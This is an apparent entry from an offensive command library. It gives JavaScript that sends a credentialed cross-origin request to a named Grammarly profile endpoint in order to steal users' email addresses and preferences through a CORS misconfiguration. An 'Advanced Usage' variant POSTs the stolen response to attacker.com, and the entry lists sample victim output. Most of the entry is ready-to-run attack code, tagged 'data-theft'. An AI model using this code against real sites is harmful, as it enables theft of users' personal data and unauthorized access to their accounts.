---
id: cmd-js-get-profile
data: >-
  var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if
  (this.readyState == 4 && this.status == 200) {
  document.getElementById("response-node").innerHTML = this.responseText; } };
  xhttp.open("GET", "https://g-mail.grammarly.com/profile", true);
  xhttp.withCredentials = true; xhttp.send();
tags:
  - cors
  - data-theft
type: command
output: >-
  {"id":749327815,"email":"email@yandex.ru","preferenceFields":[{"name":"Weekly
  Progress
  Reports","description":"...","order":49,"value":true},...],"unsubscribe":false}
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:57.761Z'
verified: false
validated: true
submitted: true
---
# javascript-get-profile-data

## Command

```javascript
var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { document.getElementById("response-node").innerHTML = this.responseText; } }; xhttp.open("GET", "https://g-mail.grammarly.com/profile", true); xhttp.withCredentials = true; xhttp.send();
```

## Description

This JavaScript command creates an XMLHttpRequest to perform a cross-origin GET to the Grammarly profile endpoint, including credentials to steal user data like email and preferences, exploiting CORS misconfiguration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | Target endpoint URL (https://g-mail.grammarly.com/profile) | Yes |
| withCredentials | Flag to include cookies (true) | Yes |
| response-node | DOM element ID to display output | No |

## Examples

### Basic Usage

```javascript
var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { console.log(this.responseText); } }; xhttp.open("GET", "https://g-mail.grammarly.com/profile", true); xhttp.withCredentials = true; xhttp.send();
```

### Advanced Usage

Add exfiltration:

```javascript
var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { fetch('http://attacker.com/leak', {method: 'POST', body: this.responseText}); } }; xhttp.open("GET", "https://g-mail.grammarly.com/profile", true); xhttp.withCredentials = true; xhttp.send();
```

## Expected Output

JSON object containing user profile: {"id":749327815,"email":"email@yandex.ru","preferenceFields":[...],"unsubscribe":false}. Displayed in the specified DOM node or console.

## Related

- [[commands/javascript-post-profile-modify]]
- [[procedures/Cross-Origin-GET-Request-for-Profile-Data-Theft]]
